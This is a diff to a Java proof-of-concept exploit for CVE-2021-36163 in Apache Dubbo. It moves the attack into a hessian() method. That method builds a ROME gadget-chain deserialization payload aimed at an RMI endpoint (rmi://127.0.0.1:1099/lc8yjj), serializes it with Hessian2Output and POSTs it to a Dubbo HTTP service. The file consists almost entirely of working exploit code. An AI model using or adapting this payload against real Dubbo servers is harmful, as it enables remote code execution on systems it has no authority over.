@@ -2,12 +2,14 @@ package org.apache.dubbo.samples.http;
 
 import com.caucho.hessian.io.Hessian2Output;
 import com.caucho.hessian.io.SerializerFactory;
+import com.caucho.services.server.GenericService;
 import org.apache.dubbo.common.serialize.Cleanable;
 import org.apache.http.HttpResponse;
 import org.apache.http.client.methods.HttpPost;
 import org.apache.http.entity.ByteArrayEntity;
 import org.apache.http.impl.client.CloseableHttpClient;
 import org.apache.http.impl.client.HttpClients;
+import org.springframework.remoting.rmi.RmiProxyFactoryBean;
 
 import java.io.ByteArrayOutputStream;
 import java.io.FileOutputStream;
@@ -21,6 +23,11 @@ import java.io.FileOutputStream;
 public class CVE_2021_36163 {
 
     public static void main(String[] args) throws Exception {
+        // hessian 利用
+        hessian();
+    }
+
+    public static void hessian() throws Exception{
         Object o = GadgetBuilder.romePayload("rmi://127.0.0.1:1099/lc8yjj");
 
         // write header into OS
@@ -77,7 +84,5 @@ public class CVE_2021_36163 {
         post.setEntity(new ByteArrayEntity(baos.toByteArray()));
         HttpResponse response = client.execute(post);
         System.out.println(response.getStatusLine());
-
-
     }
 }
